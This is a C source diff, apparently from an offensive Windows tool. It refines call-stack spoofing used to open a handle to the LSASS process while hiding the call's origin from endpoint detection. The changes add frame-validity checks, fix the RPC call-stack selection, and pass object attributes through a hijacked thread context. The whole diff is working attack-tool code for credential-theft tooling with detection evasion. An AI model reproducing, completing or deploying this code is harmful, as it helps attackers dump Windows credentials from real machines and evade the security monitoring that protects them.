@@ -21,6 +21,7 @@ VOID set_frame_info(
     frame->pushRbp = FALSE;
     frame->countOfCodes = 0;
     frame->pushRbpIndex = 0;
+    frame->is_valid = FALSE;
 }
 
 VOID set_svchost_callstack(
@@ -318,11 +319,10 @@ cleanup:
  * via loading any required dlls, resolving module addresses
  * and calculating spoofed return addresses.
  */
-BOOL initialize_spoofed_callstack(
+VOID initialize_spoofed_callstack(
     PSTACK_FRAME callstack,
     DWORD number_of_frames)
 {
-    BOOL ret_val = FALSE;
     BOOL success = FALSE;
     PSTACK_FRAME frame = NULL;
 
@@ -335,7 +335,7 @@ BOOL initialize_spoofed_callstack(
         if (!success)
         {
             DPRINT_ERR("Failed to calculate ret address");
-            goto cleanup;
+            continue;
         }
 
         // [2] Calculate the total stack size for ret function.
@@ -343,18 +343,16 @@ BOOL initialize_spoofed_callstack(
         if (!success)
         {
             DPRINT_ERR("Failed to calculate the stack size");
-            goto cleanup;
+            continue;
         }
+
+        frame->is_valid = TRUE;
     }
-
-    ret_val = TRUE;
-
-cleanup:
-    return ret_val;
 }
 
 DWORD dummy_function(LPVOID lpParam)
 {
+    UNUSED(lpParam);
     DPRINT("Hello from dummy function");
     return 0;
 }
@@ -411,6 +409,10 @@ VOID initialize_fake_thread_state(
     {
         // loop fron the last to the first
         stackFrame = &callstack[number_of_frames - i - 1];
+
+        // if the frame is not valid, simply ignore it
+        if (!stackFrame->is_valid)
+            continue;
 
         // [2.1] Check if the last frame set UWOP_SET_FPREG.
         // If the previous frame uses the UWOP_SET_FPREG
@@ -521,12 +523,12 @@ LONG CALLBACK veh_callback(
 HANDLE open_handle_with_spoofed_callstack(
     IN DWORD stack_type,
     IN DWORD lsass_pid,
-    IN DWORD permissions)
+    IN DWORD permissions,
+    IN DWORD attributes)
 {
     DWORD number_of_frames = 0;
     NTSTATUS status = STATUS_UNSUCCESSFUL;
     HANDLE hThread = NULL;
-    BOOL success = FALSE;
     CONTEXT context = { 0 };
     HANDLE hProcess = NULL;
     PVOID pHandler = NULL;
@@ -577,7 +579,7 @@ HANDLE open_handle_with_spoofed_callstack(
             break;
         case RPC_STACK:
             DPRINT("using rpc callstack");
-            set_wmi_callstack(callstack, &number_of_frames);
+            set_rpc_callstack(callstack, &number_of_frames);
             break;
         default:
             DPRINT_ERR("Invalid stack type");
@@ -589,14 +591,9 @@ HANDLE open_handle_with_spoofed_callstack(
      * will load any required dlls, calculate ret addresses,
      * and individual stack sizes needed to mimic the call stack.
      */
-    success = initialize_spoofed_callstack(
+    initialize_spoofed_callstack(
         callstack,
         number_of_frames);
-    if (!success)
-    {
-        DPRINT_ERR("Failed to initialize fake call stack");
-        goto cleanup;
-    }
 
     /*
      * [2] Create suspended thread.
@@ -646,7 +643,7 @@ HANDLE open_handle_with_spoofed_callstack(
     // RDX
     context.Rdx = (DWORD64)permissions;
     // R8
-    InitializeObjectAttributes(&objectAttr, NULL, 0, NULL, NULL);
+    InitializeObjectAttributes(&objectAttr, NULL, attributes, NULL, NULL);
     context.R8 = (DWORD64)&objectAttr;
     // R9
     clientId.UniqueProcess = (HANDLE)(ULONG_PTR)lsass_pid;
@@ -714,7 +711,8 @@ cleanup:
 HANDLE open_handle_with_spoofed_callstack(
     IN DWORD stack_type,
     IN DWORD lsass_pid,
-    IN DWORD permissions)
+    IN DWORD permissions,
+    IN DWORD attributes)
 {
     PRINT_ERR("This function supports x64 only");
     return NULL;
